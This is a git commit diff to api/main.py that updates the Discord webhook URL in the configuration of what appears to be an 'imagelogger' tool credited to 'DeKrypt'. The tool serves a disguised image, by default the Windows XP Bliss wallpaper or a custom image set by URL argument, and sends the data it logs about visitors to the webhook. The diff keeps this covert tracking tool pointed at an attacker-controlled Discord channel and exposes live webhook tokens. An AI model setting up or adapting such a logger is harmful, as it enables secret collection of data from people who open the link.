674dac22418534a2030ede70d1ae64cdd3ca66bf
senbox2015-prog <senbox2015@gmail.com>
2026-01-20 17:16:31 +0000

    Update Discord webhook URL in configuration

--- api/main.py
+++ api/main.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1462893167958560879/aKsdb6J-B8matS93-jb6rUqWiEvifHQqxodU9C6MCd5tWLcuOV6xY6zcSKWqi1kQfQpF",
+    "webhook": "https://discord.com/api/webhooks/1463220514104545570/6xAh9qPstDV9wBC82gU-B99QNV2YXgQjWHzxArUQSbr4Ekk_aRzipY80BCM8S-KFw058",
     "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
